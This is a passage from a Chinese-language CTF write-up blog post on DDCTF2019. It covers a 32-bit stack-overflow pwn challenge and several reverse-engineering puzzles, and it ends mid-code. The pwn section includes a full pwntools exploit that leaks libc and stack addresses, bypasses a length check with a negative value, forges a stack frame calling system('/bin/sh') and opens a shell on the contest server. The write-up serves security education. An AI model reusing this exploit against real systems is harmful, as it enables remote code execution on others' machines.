{"name":"RE","slug":"RE","count":2,"postlist":[{"title":"DDCTF2019-writeup","slug":"DDCTF2019-writeup","date":"2019-04-18T11:41:06.000Z","updated":"2019-04-21T03:09:33.457Z","comments":true,"path":"api/articles/DDCTF2019-writeup.json","excerpt":"","keywords":null,"cover":null,"content":"<p>本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。</p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><p>pwn只有一道题目</p>\n<h2 id=\"Strike\"><a href=\"#Strike\" class=\"headerlink\" title=\"Strike\"></a>Strike</h2><p>该题目提供了libc，防护如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/DDCTF2019/xpwn&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>未开启canary和PIE，只开启了NX，且为32位，有栈利用的可能。</p>\n<p>简单运行程序发现程序首先要求输入用户名，然后在打印用户名的时候会出现一些不可见字符，这里可能存在信息泄漏漏洞。之后要求输入密码的长度，再输入密码。用IDA简单查看下：</p>\n<p>在向栈上写name时，由于写完就用格式化字符串的%s格式输出，所以只要不输入\\x00，就可以随意leak出栈上的数据。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">sub_80485DB</span><span class=\"params\">(FILE *stream, FILE *a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+0h] [ebp-48h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter username: \"</span>);</span><br><span class=\"line\">  v2 = fileno(stream);</span><br><span class=\"line\">  read(v2, &amp;buf, <span class=\"number\">0x40</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">fprintf</span>(a2, <span class=\"string\">\"Hello %s\"</span>, &amp;buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调试可知，我们从ebp-0x48处开始写，而ebp-0x20处为栈地址，ebp-0x24处为libc地址，所以padding 0x48 - 0x20字节可以直接leak处栈地址和libc地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp 100</span><br><span class=\"line\">0xffffcf00│+0x0000: 0x00000000\t ← $esp</span><br><span class=\"line\">0xffffcf04│+0x0004: 0xffffcf10  →  0xf7ffd000  →  0x00023f40</span><br><span class=\"line\">0xffffcf08│+0x0008: 0x00000040 (&quot;@&quot;?)</span><br><span class=\"line\">0xffffcf0c│+0x000c: 0xffffcf88  →  0xf7e0bdc8  →  0x00002b76 (&quot;v+&quot;?)</span><br><span class=\"line\">0xffffcf10│+0x0010: 0xf7ffd000  →  0x00023f40  &lt;= 从这里开始写</span><br><span class=\"line\">0xffffcf14│+0x0014: 0x080482c8  →   add BYTE PTR [ecx+ebp*2+0x62], ch</span><br><span class=\"line\">0xffffcf18│+0x0018: 0x08048258  →  0x00000057 (&quot;W&quot;?)</span><br><span class=\"line\">0xffffcf1c│+0x001c: 0x00000000</span><br><span class=\"line\">0xffffcf20│+0x0020: 0xf7ffda74  →  0xf7fd3470  →  0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf24│+0x0024: 0xf7e0bcc8  →  0x000029d0</span><br><span class=\"line\">0xffffcf28│+0x0028: 0xf7e5f21b  →  &lt;setbuffer+11&gt; add ebx, 0x151de5</span><br><span class=\"line\">0xffffcf2c│+0x002c: 0x00000000</span><br><span class=\"line\">0xffffcf30│+0x0030: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf34│+0x0034: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf38│+0x0038: 0xffffcfc8  →  0x00000000 &lt;= main函数的ebp地址</span><br><span class=\"line\">0xffffcf3c│+0x003c: 0xf7e65005  →  &lt;setbuf+21&gt; add esp, 0x1c &lt;= libc地址</span><br><span class=\"line\">0xffffcf40│+0x0040: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf44│+0x0044: 0x00000000</span><br><span class=\"line\">0xffffcf48│+0x0048: 0x00002000</span><br><span class=\"line\">0xffffcf4c│+0x004c: 0xf7e64ff0  →  &lt;setbuf+0&gt; sub esp, 0x10</span><br><span class=\"line\">0xffffcf50│+0x0050: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf54│+0x0054: 0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf58│+0x0058: 0xffffcfc8  →  0x00000000\t ← $ebp</span><br></pre></td></tr></table></figure>\n<p>然后考虑如何劫持控制流。这里注意，虽然在检查长度时会强制转换为有符号数，但是在read函数传参时仍旧把nbytes当作无符号数，所以如果输入负数，就可以绕过长度检查，实现任意长度的栈溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nbytes = read_num();</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)nbytes &gt; <span class=\"number\">63</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">\"Too long!\"</span>);</span><br><span class=\"line\">   <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter password(lenth %u): \"</span>, nbytes);</span><br><span class=\"line\"> v1 = fileno(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\"> read(v1, &amp;buf, nbytes); &lt;= IO2BO</span><br></pre></td></tr></table></figure>\n<p>但是main函数返回的栈桢操作比较特殊，在main函数返回之前的汇编语句如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08048735                 mov     eax, 0</span><br><span class=\"line\">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class=\"line\">.text:0804873D                 pop     ecx</span><br><span class=\"line\">.text:0804873E                 pop     ebx</span><br><span class=\"line\">.text:0804873F                 pop     ebp</span><br><span class=\"line\">.text:08048740                 lea     esp, [ecx-4]</span><br><span class=\"line\">.text:08048743                 retn</span><br></pre></td></tr></table></figure>\n<p>首先令esp指向ebp-8处，然后分别pop三次给ecx, ebx和ebp，最后将esp指向ecx-4处，然后retn，也就是将eip转到ecx-4处开始执行代码。所以我们需要在ebp-8处布置栈，令esp和ebp均指向我们构造的栈桢处。直接看exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p32(system) <span class=\"comment\"># [ebp - 0x4c]</span></span><br><span class=\"line\">payload += p32(main) <span class=\"comment\"># fake ebp of system [ebp - 0x4c + 4]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>) <span class=\"comment\"># arg1:the addr of /bin/sh [ebp - 0x4c + 8]</span></span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span> <span class=\"comment\"># [ebp - 0x4c + 12]</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>) <span class=\"comment\"># padding to [ebp - 8]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># ecx = target_addr + 4</span></span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span> <span class=\"comment\"># ebx</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># fake ebp</span></span><br></pre></td></tr></table></figure>\n<p>最终完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./xpwn\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"116.85.48.105\"</span>,<span class=\"string\">\"5005\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc.so.6\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"username: \"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">10</span> * <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">stack_addr = u32(p.recvuntil(<span class=\"string\">\"\\xff\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)</span><br><span class=\"line\">leak = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = leak - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"><span class=\"comment\"># binsh = next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"password: \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"-1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"): \"</span>)</span><br><span class=\"line\">main = <span class=\"number\">0x804862d</span></span><br><span class=\"line\">payload = p32(system)</span><br><span class=\"line\">payload += p32(main)</span><br><span class=\"line\"><span class=\"comment\"># payload += p32(binsh)</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">All done, bye!</span><br><span class=\"line\">$ cat flag</span><br><span class=\"line\">DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h1><h2 id=\"RE1\"><a href=\"#RE1\" class=\"headerlink\" title=\"RE1\"></a>RE1</h2><p>本题相当简单，是RE的签到题，就是一个字符匹配，写脚本迭代即可。直接upx脱壳。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"string\">\"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#\\\"!\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">target = <span class=\"string\">\"DDCTF&#123;reverseME&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_addr = <span class=\"number\">0x402ff8</span></span><br><span class=\"line\">first_addr = <span class=\"number\">0x403018</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> target:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(magic)):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> magic[i] == ch:</span><br><span class=\"line\">\t\t\tflag += chr(i + first_addr - base_addr)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<p>DDCTF{ZZ[JX#,9(9,+9QY!}</p>\n<h2 id=\"RE2\"><a href=\"#RE2\" class=\"headerlink\" title=\"RE2\"></a>RE2</h2><p>本题也不算难，只是需要比上题多一点的逆向功底，可以说上题只靠调试器就能解决了。该题首先将16进制字符串解码，然后base64编码，令编码后的结果为”reserse+”即可。这里在二进制文件中并没有base64的那个明显的字符串，但是有一个64位的字符串很可疑，最后调试发现其实就是标准的base64算法。</p>\n<p>对了，本题也加了壳，但是我记得似乎不能用upx直接脱壳，用esp定律即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = <span class=\"string\">\"reverse+\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">print</span> b64decode(target).encode(<span class=\"string\">\"hex\"</span>).upper()</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{ADEBDEAEC7BE}</p>\n<h2 id=\"Confused\"><a href=\"#Confused\" class=\"headerlink\" title=\"Confused\"></a>Confused</h2><p>本题是一道macos逆向题，这是我第一次做macOS的逆向，但其实逆向的思路都是一样的。右键点击app（当然要在osx系统下）文件，选择显示包内容，然后在/Contents/MacOS/路径下就能找到可执行文件。其实我们可以直接用IDA打开这个文件进行反汇编，然后用llgb（类似gdb）加载这个文件进行动态调试。</p>\n<p>简单看一下，发现核心逻辑就在checkCode函数中。</p>\n<p>函数首先检查flag是否以”DDCTF{“开头，然后检查最后一位是否为”}”，然后用substringWithRange函数获取花括号包裹的字符串，如果它的长度为18，则合法，且转为UTF8String。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> __cdecl -[ViewController checkCode:](ViewController *self, SEL a2, id a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v5; <span class=\"comment\">// ST18_8</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v6; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v9; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v11; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v12; <span class=\"comment\">// [rsp+38h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v13; <span class=\"comment\">// [rsp+40h] [rbp-50h]</span></span><br><span class=\"line\">  __int128 v14; <span class=\"comment\">// [rsp+48h] [rbp-48h]</span></span><br><span class=\"line\">  __int64 v15; <span class=\"comment\">// [rsp+58h] [rbp-38h]</span></span><br><span class=\"line\">  SEL v16; <span class=\"comment\">// [rsp+60h] [rbp-30h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v17; <span class=\"comment\">// [rsp+68h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v18; <span class=\"comment\">// [rsp+70h] [rbp-20h]</span></span><br><span class=\"line\">  __int64 v19; <span class=\"comment\">// [rsp+78h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+80h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v21; <span class=\"comment\">// [rsp+88h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v17 = self;</span><br><span class=\"line\">  v16 = a2;</span><br><span class=\"line\">  v15 = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, (__int64)a3);</span><br><span class=\"line\">  v3 = objc_msgSend(v17, <span class=\"string\">\"pwd\"</span>);</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v3);</span><br><span class=\"line\">  v5 = v4;</span><br><span class=\"line\">  v6 = objc_msgSend(v4, <span class=\"string\">\"stringValue\"</span>);</span><br><span class=\"line\">  v14 = (<span class=\"keyword\">unsigned</span> __int64)objc_retainAutoreleasedReturnValue((__int64)v6);</span><br><span class=\"line\">  objc_release(v5);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"hasPrefix:\"</span>, CFSTR(<span class=\"string\">\"DDCTF&#123;\"</span>)) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v7 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">    v8 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringFromIndex:\"</span>, v7 - <span class=\"number\">1</span>);</span><br><span class=\"line\">    v13 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v8);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend(v13, <span class=\"string\">\"isEqualToString:\"</span>, CFSTR(<span class=\"string\">\"&#125;\"</span>)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v9 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">      v19 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v18 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v20 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v21 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v10 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringWithRange:\"</span>, <span class=\"number\">6L</span>L, v9 - <span class=\"number\">7</span>);</span><br><span class=\"line\">      v12 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v10);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( objc_msgSend(v12, <span class=\"string\">\"length\"</span>) == (<span class=\"keyword\">void</span> *)<span class=\"number\">18</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v11 = (<span class=\"keyword\">void</span> *)objc_retainAutorelease(v12);</span><br><span class=\"line\">        *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) = objc_msgSend(v11, <span class=\"string\">\"UTF8String\"</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      objc_storeStrong((__int64)&amp;v12, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    objc_storeStrong((__int64)&amp;v13, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_1000011D0(*((__int64 *)&amp;v14 + <span class=\"number\">1</span>)) == <span class=\"number\">1</span> )</span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onSuccess\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v14, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在sub_100001f60中，对一个结构体进行了初始化，填充了一些常量和函数指针，这个结构体是该题的核心。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F60</span><span class=\"params\">(__int64 result, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_DWORD *)result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">4</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">8</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">12</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">16</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">176</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">32</span>) = <span class=\"number\">-16</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">40</span>) = sub_100001D70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">48</span>) = <span class=\"number\">-15</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">56</span>) = sub_100001A60;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">64</span>) = <span class=\"number\">-14</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">72</span>) = sub_100001AA0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">80</span>) = <span class=\"number\">-12</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">88</span>) 